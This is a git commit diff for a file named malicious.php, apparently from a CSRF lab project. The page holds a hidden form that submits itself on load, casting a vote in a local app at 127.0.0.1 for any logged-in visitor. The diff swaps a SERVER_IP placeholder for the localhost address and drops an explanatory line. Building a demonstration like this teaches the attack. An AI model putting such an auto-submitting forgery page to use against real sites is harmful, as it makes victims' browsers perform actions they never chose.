1c0eea65daa81c107f6dbc8fe4e127b02b93c3c3
mattriley619 <mattriley619@hotmail.com>
2025-03-26 17:16:08 -0400

    still working on it, basically just bug fixes at this point

--- malicious.php
+++ malicious.php
@@ -1,15 +1,13 @@
 <html>
 <body>
 
-<form id="attack" action="http://SERVER_IP/display.php" method="POST">
+<form id="attack" action="http://127.0.0.1/CSRF_Project/display.php" method="POST">
     <input type="hidden" name="color" value="red">
 </form>
 
 <script>
     document.getElementById('attack').submit();
 </script>
-
-<p>If the user is logged in and hasn't voted, this page just cast a vote for them.</p>
 
 </body>
 </html>
